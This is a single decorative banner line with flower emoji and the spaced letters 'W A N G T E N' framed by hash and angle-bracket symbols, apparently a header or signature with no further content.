#>>>>>  💐W A N G T E N💐 <<<<<#
